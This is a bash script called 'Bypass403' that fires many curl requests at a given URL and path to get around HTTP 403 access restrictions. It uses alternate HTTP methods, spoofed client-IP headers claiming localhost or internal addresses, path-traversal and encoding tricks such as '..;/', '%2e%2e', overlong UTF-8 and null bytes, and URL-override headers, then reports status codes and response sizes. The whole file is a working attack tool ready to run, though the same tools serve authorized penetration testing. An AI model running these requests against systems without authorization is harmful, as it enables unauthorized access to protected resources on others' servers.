#!/bin/bash
figlet Bypass403
echo "                                               By Certainty"
echo "./bypass-403.sh https://example.com path"
echo " "

echo ""
echo "-- http methods"
echo ""

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2 
echo "  --> ${1}/${2} -X TRACE"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X POST $1/$2
echo "  --> ${1}/${2} -X POST"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X PUT $1/$2
echo "  --> ${1}/${2} -X PUT"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X CONNECT $1/$2
echo "  --> ${1}/${2} -X CONNECT"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X PATCH $1/$2
echo "  --> ${1}/${2} -X PATCH"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X FOO $1/$2
echo "  --> ${1}/${2} -X FOO"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X DELETE $1/$2
echo "  --> ${1}/${2} -X DELETE"

echo ""
echo "append things"
echo ""
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2 -H "X-Host: 10.0.0.0" 
echo "  --> ${1}/${2} -H X-Host: 10.0.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2? -H "X-Host: 10.0.0.1"
echo "  --> ${1}/${2}? -H X-Host: 10.0.0.1"
 
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?? -H "X-Host: 127.0.0.1:443"
echo "  --> ${1}/${2}?? -H X-Host: 127.0.0.1:443"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/? -H "X-Host: 127.0.0.1:80" 
echo "  --> ${1}/${2}/? -H X-Host: 127.0.0.1:80"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?/ -H "X-Host: localhost"
echo "  --> ${1}/${2}/?/ -H X-Host: localhost"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/??/ -H "X-Host: 172.16.0.0"
echo "  --> ${1}/${2}/??/ -H X-Host: 172.16.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.. -H "X-Forwarded-For: 10.0.0.0"
echo "  --> ${1}/${2}/.. -H X-Forwarded-For: 10.0.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/../ -H "X-Forwarded-For: 10.0.0.1"
echo "  --> ${1}/${2}/../ -H X-Forwarded-For: 10.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/./ -H "X-Forwarded-For: 127.0.0.1:443"
echo "  --> ${1}/${2}/./ -H X-Forwarded-For: 127.0.0.1:443"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.// -H "X-Forwarded-For: 127.0.0.1:80" 
echo "  --> ${1}/${2}/.// -H X-Forwarded-For: 127.0.0.1:80"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/* -H "X-Forwarded-For: localhost"
echo "  --> ${1}/${2}/* -H X-Forwarded-For: localhost"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2//* -H "X-Forwarded-For: 172.16.0.0"
echo "  --> ${1}/${2}//* -H X-Forwarded-For: 172.16.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%2f -H "X-Forwarded-Host: 10.0.0.0" 
echo "  --> ${1}/${2}/%2f -H X-Forwarded-Host: 10.0.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%2f/ -H "X-Forwarded-Host: 10.0.0.1"
echo "  --> ${1}/${2}/%2f/ -H X-Forwarded-Host: 10.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%20 -H "X-Forwarded-Host: 127.0.0.1:443"
echo "  --> ${1}/${2}/%20 -H X-Forwarded-Host: 127.0.0.1:443"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%20% -H "X-Forwarded-Host: 127.0.0.1:80" 
echo "  --> ${1}/${2}/%20% -H X-Forwarded-Host: 127.0.0.1:80"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%09 -H "X-Forwarded-Host: localhost"
echo "  --> ${1}/${2}/%09 -H X-Forwarded-Host: localhost"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%09/ -H "X-Forwarded-Host: 172.16.0.0"
echo "  --> ${1}/${2}/%09/ -H X-Forwarded-Host: 172.16.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%0a -H "Forwarded: 10.0.0.0"
echo "  --> ${1}/${2}/%0a -H Forwarded: 10.0.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%0a/ -H "Forwarded: 10.0.0.1"
echo "  --> ${1}/${2}/%0a/ -H Forwarded: 10.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%0d -H "Forwarded: 127.0.0.1:443"
echo "  --> ${1}/${2}/%0d -H Forwarded: 127.0.0.1:443"
 
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%0d/ -H "Forwarded: 127.0.0.1:80" 
echo "  --> ${1}/${2}/%0d/ -H Forwarded: 127.0.0.1:80"




curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%25 -H "Forwarded: localhost"
echo "  --> ${1}/${2}/%25 -H Forwarded: localhost"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%25/ -H "Forwarded: 172.16.0.0"
echo "  --> ${1}/${2}/%25/ -H Forwarded: 172.16.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%23 -H "Via: 10.0.0.0" 
echo "  --> ${1}/${2}/%23 -H Via: 10.0.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%23/ -H "Via: 10.0.0.1"
echo "  --> ${1}/${2}/%23/ -H Via: 10.0.0.1"
 
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%26 -H "Via: 127.0.0.1:443"
echo "  --> ${1}/${2}/%26 -H Via: 127.0.0.1:443"
 
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%26/ -H "Via: 127.0.0.1:80" 
echo "  --> ${1}/${2}/%26/ -H Via: 127.0.0.1:80"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%3f -H "Via: localhost"
echo "  --> ${1}/${2}/%3f -H Via: localhost"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%3f/ -H "Via: 172.16.0.0"
echo "  --> ${1}/${2}/%3f/ -H Via: 172.16.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/# -H "X-Real-IP: 10.0.0.0" 
echo "  --> ${1}/${2}/# -H X-Real-IP: 10.0.0.0" 

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/#/ -H "X-Remote-Addr: 10.0.0.1"
echo "  --> ${1}/${2}/#/ -H X-Remote-Addr: 10.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/#/. -H "X-Remote-Addr: 127.0.0.1:443"
echo "  --> ${1}/${2}/#/. -H X-Remote-Addr: 127.0.0.1:443"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/..;/ -H "X-Remote-Addr: 127.0.0.1:80" 
echo "  --> ${1}/${2}/..;/ -H X-Remote-Addr: 127.0.0.1:80"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.jso -H "X-Remote-Addr: localhost"
echo "  --> ${1}/${2}/.jso -H X-Remote-Addr: localhost"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/~ -H "X-Remote-Addr: 172.16.0.0"
echo "  --> ${1}/${2}/~ -H X-Remote-Addr: 172.16.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/°/
echo "  --> ${1}/${2}/°/"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/& -H "X-Requested-For: 10.0.0.0" 
echo "  --> ${1}/${2}/& -H X-Requested-For: 10.0.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/-
echo "  --> ${1}/${2}/-"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/..%3B/ -H "X-Requested-For: 10.0.0.1"
echo "  --> ${1}/${2}/..%3B/ -H X-Requested-For: 10.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/;%2f..%2f..%2f
echo "  --> ${1}/${2}/;%2f..%2f..%2f"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/..\;/
echo "  --> ${1}/${2}/..\;/"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2..;/
echo "  --> ${1}/${2}..;/"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2;/
echo "  --> ${1}/${2};/"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%00
echo "  --> ${1}/${2}%00"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.css
echo "  --> ${1}/${2}.css"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?id=1
echo "  --> ${1}/${2}?id=1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2\/\/
echo "  --> ${1}/${2}\/\/"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/
echo "  --> ${1}/${2}/"


echo ""
echo "-- Pre-path"
echo ""


curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2  -H "X-Requested-For: 127.0.0.1:443"
echo "  --> ${1}/./${2} -H X-Requested-For: 127.0.0.1:443"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/..;/$2 -H "X-Requested-For: 127.0.0.1:80" 
echo "  --> ${1}/..;/${2} -H X-Requested-For: 127.0.0.1:80"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/...$2 -H "X-Requested-For: localhost"
echo "  --> ${1}/...${2} -H X-Requested-For: localhost"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/.;/$2 -H "X-Requested-For: 172.16.0.0"
echo "  --> ${1}/.;/${2} -H X-Requested-For: 172.16.0.0"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/;/$2
echo "  --> ${1}/;/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/*/$2
echo "  --> ${1}/*/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//;//$2
echo "  --> ${1}//;//${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%20/$2
echo "  --> ${1}/%20/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/..%00$2
echo "  --> ${1}/..%00${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/..%01$2
echo "  --> ${1}/..%01${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/..%0a$2
echo "  --> ${1}/..%0a${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/..%0d$2
echo "  --> ${1}/..%0d${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/..%09$2
echo "  --> ${1}/..%09${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/~root$2
echo "  --> ${1}/~root${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/~admin$2
echo "  --> ${1}/~admin${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e%2e/$2
echo "  --> ${1}/%2e%2e/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%252e%252e/$2
echo "  --> ${1}/%252e%252e/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%c0%af/$2
echo "  --> ${1}/%c0%af/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%e0%80%af$2
echo "  --> ${1}/%e0%80%af${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/..%00/$2
echo "  --> ${1}/..%00/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/..%01/$2
echo "  --> ${1}/..%01/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/..%0a/$2
echo "  --> ${1}/..%0a/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/..%0d/$2
echo "  --> ${1}/..%0d/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/..%09/$2
echo "  --> ${1}/..%09/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%20$2
echo "  --> ${1}/%20${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e%2e$2
echo "  --> ${1}/%2e%2e${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%252e%252e$2
echo "  --> ${1}/%252e%252e${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%c0%af$2
echo "  --> ${1}/%c0%af${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%e0%80%af/$2
echo "  --> ${1}/%e0%80%af/${2}"

echo ""
echo "Special"
echo ""

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1///$2///
echo "  --> ${1}///${2}///"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%20/$2/%20
echo "  --> ${1}/%20/${2}/%20"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%20/$2/%20/
echo "  --> ${1}/%20/${2}/%20/"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/*/$2/
echo "  --> ${1}/*/${2}/"

echo "  --> ${1}/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"

